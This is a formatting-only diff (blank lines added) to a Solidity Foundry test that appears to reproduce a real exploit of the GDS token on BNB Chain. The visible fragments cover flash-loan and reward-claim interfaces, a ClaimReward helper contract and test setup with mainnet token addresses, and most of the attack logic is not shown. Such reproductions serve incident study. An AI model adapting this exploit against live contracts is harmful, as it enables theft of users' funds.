@@ -12,19 +12,26 @@ import "./../interface.sol";
 // https://bscscan.com/tx/0x2bb704e0d158594f7373ec6e53dc9da6c6639f269207da8dab883fc3b5bf6694
 
 interface GDSToken is IERC20 {
+
     function pureUsdtToToken(uint256 _uAmount) external returns (uint256);
+
 }
 
 interface ISwapFlashLoan {
+
     function flashLoan(address receiver, address token, uint256 amount, bytes memory params) external;
+
 }
 
 interface IClaimReward {
+
     function transferToken() external;
     function withdraw() external;
+
 }
 
 contract ClaimReward {
+
     address Owner;
     GDSToken GDS = GDSToken(0xC1Bb12560468fb255A8e8431BDF883CC4cB3d278);
     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
@@ -52,9 +59,11 @@ contract ClaimReward {
             GDS.balanceOf(address(this)), 0, path, Owner, block.timestamp
         );
     }
+
 }
 
 contract ContractTest is Test {
+
     GDSToken GDS = GDSToken(0xC1Bb12560468fb255A8e8431BDF883CC4cB3d278);
     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
     IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
@@ -182,4 +191,5 @@ contract ContractTest is Test {
             GDS.balanceOf(address(this)), 0, path, address(this), block.timestamp
         );
     }
+
 }
